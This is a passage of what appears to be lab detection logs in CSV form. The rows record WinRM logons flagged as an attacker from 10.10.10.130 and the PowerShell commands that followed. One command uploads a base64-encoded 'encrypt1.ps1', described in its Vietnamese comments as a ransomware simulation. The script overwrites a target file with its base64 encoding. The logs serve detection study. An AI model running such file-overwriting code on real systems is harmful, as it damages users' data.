    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}
Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}"
"2025-11-16T08:12:21.217+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}
Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}"
"2025-11-16T08:12:21.269+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:12:21.276+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt1.ps1
C:\Program Files\encrypt1.ps1","null
null"
"2025-11-16T08:12:21.358+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:12:21.395+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:13:05.331+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:13:05.363+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T08:13:05.478+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_lntjpoqe.gqk.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_lntjpoqe.gqk.ps1","null
null"
"2025-11-16T08:13:05.783+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""3051eb5a911e5e9acc973c5e415f02cad2fb4c4e"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:13:05.788+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-16T08:13:05.803+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-16T08:13:05.813+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-16T08:13:05.866+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}
Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}"
"2025-11-16T08:13:05.884+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}
Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}"
"2025-11-16T08:13:05.940+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:13:05.947+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt1.ps1
C:\Program Files\encrypt1.ps1","null
null"
"2025-11-16T08:13:06.039+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQoK')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiZGF0YV9pbXBvcnRhbnQudHh0LnJlY292ZXJlZC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQoK')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:13:06.082+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:13:17.865+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat  data_important.txt.recovered.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat  data_important.txt.recovered.txt
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:08:19.221+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:08:47.159+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:08:47.237+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-18T11:08:47.456+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_snctjpxy.sqt.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_snctjpxy.sqt.ps1","null
null"
"2025-11-18T11:08:47.831+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:10:00.030+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-18T11:10:00.070+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-18T11:11:00.518+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
